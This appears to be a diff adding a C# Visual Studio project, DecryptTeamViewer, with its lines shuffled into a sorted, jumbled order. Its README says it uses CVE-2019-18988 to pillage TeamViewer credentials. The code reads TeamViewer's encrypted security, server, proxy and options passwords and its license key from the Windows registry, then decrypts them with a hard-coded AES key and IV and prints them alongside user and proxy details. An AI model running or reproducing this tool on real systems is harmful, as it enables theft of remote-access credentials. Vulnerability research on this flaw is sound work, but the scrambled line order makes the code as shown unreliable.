@@ -1,0 +1,238 @@
+                    Padding = PaddingMode.Zeros
+                    regKeyValue = regKey.GetValue(value)
+                    return null
+                    return plaintextPass
+                    string plaintextPass = Encoding.Unicode.GetString(decrytedPass)
+                // AES settings
+                // Decrypt AES passwords
+                // TeamViewer Key 
+                Aes aes = new AesManaged
+                else
+                if (encryptedPass != null)
+                if (regKey != null)
+                regKeyValue = null
+                return null
+                return regKeyValue
+                {
+                }
+            // Credentials
+            // Gets registry values from TeamViewer keys
+            // License
+            // Options pass
+            // Proxy info
+            // Security pass
+            // Server pass
+            // TeamViewer version
+            // User info
+            Object regKeyValue = new Object()
+            catch (Exception)
+            else
+            try
+            {
+            }
+        public static string DecryptAES(byte[] encryptedPass)
+        static void Main(string[] args)
+        {
+        }
+      <Install>false</Install>
+      <Install>true</Install>
+      <ProductName>.NET Framework 3.5 SP1</ProductName>
+      <ProductName>Microsoft .NET Framework 4.6 %28x86 and x64%29</ProductName>
+      <Visible>False</Visible>
+    </BootstrapperPackage>
+    </startup>
+    <ApplicationRevision>0</ApplicationRevision>
+    <ApplicationVersion>1.0.0.%2a</ApplicationVersion>
+    <AssemblyName>DecryptTeamViewer</AssemblyName>
+    <AutoGenerateBindingRedirects>true</AutoGenerateBindingRedirects>
+    <BootstrapperEnabled>true</BootstrapperEnabled>
+    <DebugSymbols>true</DebugSymbols>
+    <DebugType>full</DebugType>
+    <DebugType>pdbonly</DebugType>
+    <DefineConstants>DEBUG
+    <DefineConstants>TRACE</DefineConstants>
+    <Deterministic>true</Deterministic>
+    <ErrorReport>prompt</ErrorReport>
+    <FileAlignment>512</FileAlignment>
+    <Install>true</Install>
+    <InstallFrom>Disk</InstallFrom>
+    <IsWebBootstrapper>false</IsWebBootstrapper>
+    <MapFileExtensions>true</MapFileExtensions>
+    <Optimize>false</Optimize>
+    <Optimize>true</Optimize>
+    <OutputPath>bin
+    <OutputType>Exe</OutputType>
+    <PlatformTarget>AnyCPU</PlatformTarget>
+    <ProjectGuid>{D6AAED62-BBFC-4F2A-A2A4-35EC5B2A4E07}</ProjectGuid>
+    <PublishUrl>publish
+    <RootNamespace>DecryptTeamViewer</RootNamespace>
+    <TargetFrameworkVersion>v4.6</TargetFrameworkVersion>
+    <UpdateEnabled>false</UpdateEnabled>
+    <UpdateInterval>7</UpdateInterval>
+    <UpdateIntervalUnits>Days</UpdateIntervalUnits>
+    <UpdateMode>Foreground</UpdateMode>
+    <UpdatePeriodically>false</UpdatePeriodically>
+    <UpdateRequired>false</UpdateRequired>
+    <UseApplicationTrust>false</UseApplicationTrust>
+    <WarningLevel>4</WarningLevel>
+    <startup> 
+    class Program
+    {
+    }
+  </ItemGroup>
+  </PropertyGroup>
+  <ItemGroup>
+  <PropertyGroup>
+ DecryptAES(exportedSecurityPass))
+ DecryptAES(licenseKey) 
+ DecryptAES(optionsPass))
+ DecryptAES(proxyPass))
+ DecryptAES(securityPass))
+ DecryptAES(serverPass))
+ DecryptTeamViewer
+ Usage
+ Visual Studio Version 16
+![DecryptTeamViewer](https://securityonline.info/wp-content/uploads/2020/02/s.png)
+"                    BlockSize = 128,"
+"                    KeySize = 128,"
+"                    Mode = CipherMode.CBC,"
+"                    var decrytedPass = AESDecrypt.TransformFinalBlock(encryptedPass, 0, encryptedPass.Length)"
+"                ICryptoTransform AESDecrypt = aes.CreateDecryptor(key, IV)"
+"                byte[] IV = new byte[16] { 0x01, 0x00, 0x01, 0x00, 0x67, 0x24, 0x4F, 0x43, 0x6e, 0x67, 0x62, 0xf2, 0x5e, 0xa8, 0xd7, 0x04 }"
+"                byte[] key = new byte[16] { 0x06, 0x02, 0x00, 0x00, 0x00, 0xa4, 0x00, 0x00, 0x52, 0x53, 0x41, 0x31, 0x00, 0x04, 0x00, 0x00 }"
+"                var regKey = Registry.CurrentUser.OpenSubKey(@""SOFTWARE"
+"                var regKey = Registry.LocalMachine.OpenSubKey(@""SOFTWARE"
+"            Console.WriteLine("""
+"            Console.WriteLine(""Account name: "" "
+"            Console.WriteLine(""Proxy IP: "" "
+"            Console.WriteLine(""Proxy password: "" "
+"            Console.WriteLine(""Proxy username: "" "
+"            Console.WriteLine(""TeamViewer exported security password: "" "
+"            Console.WriteLine(""TeamViewer license key: "" "
+"            Console.WriteLine(""TeamViewer options password: "" "
+"            Console.WriteLine(""TeamViewer security password: "" "
+"            Console.WriteLine(""TeamViewer server password: "" "
+"            Console.WriteLine(""User email: "" "
+"            Console.WriteLine(GetRegValue(""TeamViewerSettings"", ""Version""))"
+"            else if (hive == ""TeamViewerUserSettings"")"
+"            if (hive == ""TeamViewerSettings"")"
+"            var exportedSecurityPass = (byte[])GetRegValue(""TeamViewerSettings"", ""SecurityPasswordExported"")"
+"            var licenseKey = (byte[])GetRegValue(""TeamViewerSettings"", ""LicenseKeyAES"")"
+"            var optionsPass = (byte[])GetRegValue(""TeamViewerSettings"", ""OptionsPasswordAES"")"
+"            var proxyPass = (byte[])GetRegValue(""TeamViewerSettings"", ""ProxyPasswordAES"")"
+"            var securityPass = (byte[])GetRegValue(""TeamViewerSettings"", ""SecurityPasswordAES"")"
+"            var serverPass = (byte[])GetRegValue(""TeamViewerSettings"", ""ServerPasswordAES"")"
+"        <supportedRuntime version=""v4.0"" sku="".NETFramework,Version=v4.6"" />"
+"        public static object GetRegValue(string hive, string value)"
+"    <BootstrapperPackage Include="".NETFramework,Version=v4.6"">"
+"    <BootstrapperPackage Include=""Microsoft.Net.Framework.3.5.SP1"">"
+"    <Compile Include=""Program.cs"" />"
+"    <Compile Include=""Properties"
+"    <Configuration Condition="" '$(Configuration)' == '' "">Debug</Configuration>"
+"    <None Include=""App.config"" />"
+"    <Platform Condition="" '$(Platform)' == '' "">AnyCPU</Platform>"
+"    <Reference Include=""Microsoft.CSharp"" />"
+"    <Reference Include=""System"" />"
+"    <Reference Include=""System.Core"" />"
+"    <Reference Include=""System.Data"" />"
+"    <Reference Include=""System.Data.DataSetExtensions"" />"
+"    <Reference Include=""System.Net.Http"" />"
+"    <Reference Include=""System.Xml"" />"
+"    <Reference Include=""System.Xml.Linq"" />"
+"  2020"")]"
+"  <Import Project=""$(MSBuildExtensionsPath)"
+"  <Import Project=""$(MSBuildToolsPath)"
+"  <PropertyGroup Condition="" '$(Configuration)"
+" GetRegValue(""TeamViewerSettings"", ""OwningManagerAccountName""))"
+" GetRegValue(""TeamViewerSettings"", ""ProxyUsername""))"
+" GetRegValue(""TeamViewerSettings"", ""Proxy_IP""))"
+" GetRegValue(""TeamViewerUserSettings"", ""BuddyLoginName""))"
+"// COM, set the ComVisible attribute to true on that type."
+"// [assembly: AssemblyVersion(""1.0."
+"<Project ToolsVersion=""15.0"" xmlns=""http://schemas.microsoft.com/developer/msbuild/2003"">"
+"AnyCPU' "">"
+"AssemblyInfo.cs"" />"
+"DecryptTeamViewer.csproj"", ""{D6AAED62-BBFC-4F2A-A2A4-35EC5B2A4E07}"""
+"Microsoft Visual Studio Solution File, Format Version 12.00"
+"Microsoft.CSharp.targets"" />"
+"Microsoft.Common.props"" Condition=""Exists('$(MSBuildExtensionsPath)"
+"Microsoft.Common.props')"" />"
+"Project(""{FAE04EC0-301F-11D3-BF4B-00C04F79EFBC}"") = ""DecryptTeamViewer"", ""DecryptTeamViewer"
+"TeamViewer"", false)"
+"[assembly: AssemblyCompany("""")]"
+"[assembly: AssemblyConfiguration("""")]"
+"[assembly: AssemblyCopyright(""Copyright "
+"[assembly: AssemblyCulture("""")]"
+"[assembly: AssemblyDescription("""")]"
+"[assembly: AssemblyFileVersion(""1.0.0.0"")]"
+"[assembly: AssemblyProduct(""DecryptTeamViewer"")]"
+"[assembly: AssemblyTitle(""DecryptTeamViewer"")]"
+"[assembly: AssemblyTrademark("""")]"
+"[assembly: AssemblyVersion(""1.0.0.0"")]"
+"[assembly: Guid(""d6aaed62-bbfc-4f2a-a2a4-35ec5b2a4e07"")]"
+"xml version=""1.0"" encoding=""utf-8"" "
+"xml version=""1.0"" encoding=""utf-8"""
+$(MSBuildToolsVersion)
+$(Platform)' == 'Debug
+$(Platform)' == 'Release
+' as shown below:
+//      Build Number
+//      Major Version
+//      Minor Version
+//      Revision
+// General Information about an assembly is controlled through the following
+// Setting ComVisible to false makes the types in this assembly not visible
+// The following GUID is for the ID of the typelib if this project is exposed to COM
+// Version information for an assembly consists of the following four values:
+// You can specify all the values or you can default the Build and Revision Numbers
+// associated with an assembly.
+// by using the '
+// set of attributes. Change these attribute values to modify the information
+// to COM components.  If you need to access a type in this assembly from
+</OutputPath>
+</Project>
+</PublishUrl>
+</configuration>
+<configuration>
+Any CPU
+Any CPU = Debug
+Any CPU = Release
+Any CPU.ActiveCfg = Debug
+Any CPU.ActiveCfg = Release
+Any CPU.Build.0 = Debug
+Any CPU.Build.0 = Release
+Blogpost detailing the vulnerability: https://whynotsecurity.com/blog/teamviewer/
+Debug
+DecryptTeamViewer.exe
+EndGlobal
+EndGlobalSection
+EndProject
+Global
+GlobalSection(ExtensibilityGlobals) = postSolution
+GlobalSection(ProjectConfigurationPlatforms) = postSolution
+GlobalSection(SolutionConfigurationPlatforms) = preSolution
+GlobalSection(SolutionProperties) = preSolution
+HideSolutionNode = FALSE
+MinimumVisualStudioVersion = 10.0.40219.1
+Release
+SolutionGuid = {0C02553C-431C-4BB7-AEC1-3CDC69A660E8}
+TRACE</DefineConstants>
+Uses CVE-2019-18988 to enumerate and decrypt TeamViewer credentials from Windows registry. Vulnerability research done by [Nic Losby](https://twitter.com/Blurbdust).
+VisualStudioVersion = 16.0.29728.190
+WOW6432Node
+[assembly: ComVisible(false)]
+n=== DecryptTeamViewer: Pillaging registry for TeamViewer information ===
+n=== Decrypted Credentials ===
+n=== Proxy Information ===
+n=== TeamViewer version ===
+n=== User Information ===
+namespace DecryptTeamViewer
+using Microsoft.Win32
+using System
+using System.Reflection
+using System.Runtime.CompilerServices
+using System.Runtime.InteropServices
+using System.Security.Cryptography
+using System.Text
+{D6AAED62-BBFC-4F2A-A2A4-35EC5B2A4E07}.Debug
+{D6AAED62-BBFC-4F2A-A2A4-35EC5B2A4E07}.Release
